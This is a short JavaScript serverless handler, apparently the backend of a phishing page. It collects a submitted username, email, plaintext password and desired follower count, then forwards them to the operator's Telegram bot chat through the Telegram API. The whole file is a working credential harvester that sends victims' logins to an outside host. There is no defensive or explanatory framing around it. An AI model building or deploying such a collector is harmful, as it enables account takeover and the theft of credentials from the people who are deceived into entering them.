// api/sendMessage.js

export default async function handler(req, res) {
    if (req.method === 'POST') {
        // Get form data from the request body
        const { username, email, password, followers } = req.body;

        // If any required fields are missing, send an error
        if (!username || !email || !password || !followers) {
            return res.status(400).json({ error: 'Please fill all fields.' });
        }

        // Create the message to send to Telegram
        const message = `New Request:\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}\nFollowers: ${followers}`;

        // Get the Telegram Bot Token and Chat ID from environment variables
        const BOT_TOKEN = process.env.BOT_TOKEN;  // Fetch bot token securely
        const CHAT_ID = process.env.CHAT_ID;    // Fetch chat ID securely

        // URL for the Telegram API
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        // Prepare data to send to the Telegram API
        const params = {
            chat_id: CHAT_ID,
            text: message,
        };

        // Send the data to the Telegram Bot
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(params),
            });

            if (!response.ok) {
                throw new Error('Failed to send message');
            }

            const data = await response.json();
            return res.status(200).json(data);  // Return success message to frontend
        } catch (error) {
            return res.status(500).json({ error: 'Failed to send message to Telegram.' });
        }
    } else {
        // If the request method is not POST, send an error
        res.status(405).json({ error: 'Method Not Allowed' });
    }
                                      }
